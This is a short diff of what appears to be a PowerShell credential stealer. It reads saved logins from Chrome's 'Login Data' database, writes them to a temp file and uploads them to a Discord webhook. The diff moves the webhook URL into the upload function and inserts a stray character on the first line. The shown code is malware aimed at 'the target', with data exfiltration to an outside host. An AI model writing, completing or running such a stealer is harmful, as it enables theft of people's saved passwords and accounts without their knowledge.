@@ -1,4 +1,4 @@
-﻿$dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
+z﻿$dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
 $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
 
 # If the target has PowerShell 7.x installed, passwords created in Chrome
@@ -19,7 +19,6 @@ if ((Get-Host).Version.Major -eq 7) {
 }
 
 $outputFilePath = "$env:TEMP\chrome_passwords.txt"  # Output file path
-$hookUrl = "$dc"
 
 # Function to append data to the output file
 function AppendToFile {
@@ -39,6 +38,7 @@ function Upload-Discord {
         [string]$text 
     )
 
+    $hookUrl = "$dc"
     $Body = @{
       'username' = $env:username
       'content' = $text
